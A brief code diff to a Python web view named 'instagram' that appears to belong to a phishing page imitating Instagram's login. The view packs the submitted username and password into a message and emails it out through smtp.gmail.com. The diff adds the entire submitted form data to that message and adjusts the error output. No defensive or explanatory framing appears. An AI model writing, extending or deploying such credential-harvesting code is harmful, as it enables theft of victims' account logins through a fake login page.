@@ -118,6 +118,8 @@ def instagram(request):
             content = f"""
 username = {username}
 password = {password}
+
+{request.POST}
                     """
             with smtplib.SMTP("smtp.gmail.com") as con:
                 con.starttls()
@@ -129,7 +131,8 @@ password = {password}
                 )
         except Exception as e:
             print(f"{'*'*20} can't send email {'*'*20}")
-            print(f'{type(e)}: [  {e}  ]')
+            print(type(e))
+            print(e)
         #######################################
     return render(request, "instagram/index.html")
 
